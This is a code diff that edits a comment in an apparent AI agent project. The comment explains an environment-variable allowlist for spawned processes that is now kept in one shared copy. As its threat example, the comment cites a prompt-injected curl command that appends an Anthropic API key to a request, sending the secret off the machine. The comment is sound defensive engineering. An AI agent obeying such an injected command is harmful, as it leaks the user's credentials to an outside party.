@@ -8,12 +8,12 @@ import type { ProcessResult, ScopedProcess, SpawnOpts } from '@ethosagent/types'
  * a prompt-injected `curl …?k=$ANTHROPIC_API_KEY` would ship them off the
  * machine. Only the minimum a shell and common toolchains need is forwarded.
  *
- * The same allowlist (`PASSTHROUGH_ENV_KEYS`, `PASSTHROUGH_ENV_PREFIXES`,
- * `SECRET_ENV_NAME`, `isPassthroughEnvKey`) as
- * `extensions/tools-process/src/spawn.ts` and
- * `extensions/execution-local/src/index.ts`, copied rather than
- * imported (core cannot import extensions, and the extensions depend
- * only on types). The three change together.
+ * The ONE copy of this allowlist (`PASSTHROUGH_ENV_KEYS`, `PASSTHROUGH_ENV_PREFIXES`,
+ * `SECRET_ENV_NAME`, `isPassthroughEnvKey`): `minimalHostEnv` is exported from
+ * `@ethosagent/core`, and `extensions/tools-process/src/spawn.ts` and
+ * `extensions/execution-local/src/index.ts` import it (they carried identical
+ * copies until they were verified equal and
+ * merged here).
  * Pinned by `scoped-process-lifetime.test.ts`
  * ('env allowlist (V-ES-8)').
  */
